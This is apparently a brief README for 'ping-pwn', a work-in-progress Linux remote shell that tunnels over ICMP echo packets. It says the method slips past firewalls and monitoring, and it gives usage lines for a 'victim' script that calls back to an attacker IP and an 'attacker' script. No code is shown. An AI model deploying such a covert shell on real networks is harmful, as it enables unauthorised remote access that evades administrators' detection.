# ping-pwn - ICMP Shell for Linux using ICMP tunneling
An ICMP tunnel (also known as ICMPTX) establishes a covert connection between two remote computers (a client and proxy), using ICMP echo requests and reply packets.

ICMP tunneling can be used to bypass firewalls rules through obfuscation of the actual traffic. Without proper deep packet inspection or log review, network administrators will not be able to detect this type of traffic through their network.

This is a work in progress

## Usage:
- Victim: ping.py <interface> <attacker IP>
- Attacker: pwn.py <interface> <victim IP>
